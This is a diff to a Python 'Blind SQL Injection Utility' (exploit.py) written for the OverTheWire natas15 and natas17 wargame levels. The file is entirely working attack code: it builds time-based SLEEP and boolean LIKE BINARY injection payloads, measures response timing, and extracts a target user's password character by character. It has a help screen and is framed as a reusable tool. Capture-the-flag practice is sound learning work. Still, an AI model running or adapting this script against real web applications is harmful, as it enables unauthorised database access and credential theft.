@@ -1,37 +1,144 @@
 #!/usr/bin/env python3
 import requests
 import string
+import time
 import sys
+import statistics
 
-if len(sys.argv) != 5:
-    print(f"Usage: {sys.argv[0]} <url> <user> <pass> <target>")
-    sys.exit(1)
+def print_help():
+    print("""
+Blind SQL Injection Utility
+===========================
 
-url, user, pw, target = sys.argv[1:]
+Usage:
+  python3 exploit.py <url> <user> <pass> <target> <mode>
 
-charset = string.ascii_letters + string.digits
+Arguments:
+  url     Target URL (e.g. http://natas17.natas.labs.overthewire.org/index.php)
+  user    HTTP auth username
+  pass    HTTP auth password
+  target  Target username to extract (e.g. natas18)
+  mode    Attack mode:  "time"  or  "boolean"
+
+Examples:
+  python3 exploit.py http://natas17.natas.labs.overthewire.org/index.php \\
+      natas17 PASSWORD natas18 time
+
+  python3 exploit.py http://natas15.natas.labs.overthewire.org/index.php \\
+      natas15 PASSWORD natas16 boolean
+
+Notes:
+  • 'time' mode uses response delays (safe for blind SQLi)
+  • 'boolean' mode relies on visible response differences
+  • Output format is standardized for logging and automation
+""")
+    sys.exit(0)
+
+
+# ---- Argument parsing ----
+if len(sys.argv) == 2 and sys.argv[1] in ("-h", "--help"):
+    print_help()
+
+if len(sys.argv) != 6:
+    print("[!] Invalid arguments.\n")
+    print_help()
+
+URL, USER, PASS, TARGET, MODE = sys.argv[1:]
+MODE = MODE.lower()
+
+CHARSET = string.ascii_letters + string.digits
+PASSWORD_LEN = 32
+
+SLEEP_TIME = 2
+SAMPLES = 5
+TIMEOUT = 10
+
 session = requests.Session()
-session.auth = (user, pw)
+session.auth = (USER, PASS)
+session.headers.update({"Connection": "keep-alive"})
 
-print("[*] Starting blind SQL extraction")
 
-password = ""
+def log_found(pos, ch, pwd):
+    print(f"[+] {pos:02d}: {ch}  →  {pwd}")
 
-for pos in range(1, 33):
-    found = False
-    for ch in charset:
-        payload = f'" OR username="{target}" AND password LIKE BINARY "{password}{ch}%" -- '
 
-        r = session.post(url, data={"username": payload})
+def median_time(payload):
+    times = []
+    for _ in range(SAMPLES):
+        t0 = time.time()
+        try:
+            session.post(URL, data={"username": payload}, timeout=TIMEOUT)
+        except requests.exceptions.RequestException:
+            pass
+        times.append(time.time() - t0)
+    return statistics.median(times)
 
-        if "This user exists." in r.text:
-            password += ch
-            print(f"[+] {password}")
-            found = True
+
+def get_baseline():
+    payload = f'{TARGET}" AND IF(1=0, SLEEP({SLEEP_TIME}), 0)-- '
+    return median_time(payload)
+
+
+def time_based():
+    print("[*] Mode: TIME-BASED SQLi")
+
+    baseline = get_baseline()
+    threshold = baseline + (SLEEP_TIME * 0.6)
+
+    print(f"[*] Baseline: {baseline:.3f}s | Threshold: {threshold:.3f}s\n")
+
+    password = ""
+
+    for pos in range(1, PASSWORD_LEN + 1):
+        found = False
+        for ch in CHARSET:
+            payload = (
+                f'{TARGET}" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}",'
+                f'SLEEP({SLEEP_TIME}),0)-- '
+            )
+            delay = median_time(payload)
+
+            if delay > threshold:
+                password += ch
+                log_found(pos, ch, password)
+                found = True
+                break
+
+        if not found:
+            print("[!] No more characters found.")
             break
 
-    if not found:
-        print("[!] No more characters found.")
-        break
+    print("\n[✓] Final password:", password)
 
-print("\n[✓] Final password:", password)
+
+def boolean_based():
+    print("[*] Mode: BOOLEAN-BASED SQLi")
+
+    password = ""
+
+    for pos in range(1, PASSWORD_LEN + 1):
+        found = False
+        for ch in CHARSET:
+            payload = f'" OR username="{TARGET}" AND password LIKE BINARY "{password}{ch}%" -- '
+            r = session.post(URL, data={"username": payload})
+
+            if "This user exists" in r.text:
+                password += ch
+                log_found(pos, ch, password)
+                found = True
+                break
+
+        if not found:
+            print("[!] No more characters found.")
+            break
+
+    print("\n[✓] Final password:", password)
+
+
+if MODE == "time":
+    time_based()
+elif MODE == "boolean":
+    boolean_based()
+else:
+    print("[!] Invalid mode. Use 'time' or 'boolean'.")
+    sys.exit(1)
